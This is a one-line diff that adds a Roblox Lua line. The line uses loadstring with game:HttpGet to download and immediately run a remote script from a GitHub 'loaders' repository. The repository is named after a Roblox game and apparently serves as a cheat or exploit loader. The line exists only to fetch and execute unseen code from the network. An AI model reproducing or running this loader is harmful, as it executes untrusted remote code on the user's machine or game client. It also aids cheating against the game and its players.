@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/build-a-base-steal-plants-co-op-spam6-hed5zxkfgd62t1.lua"))()
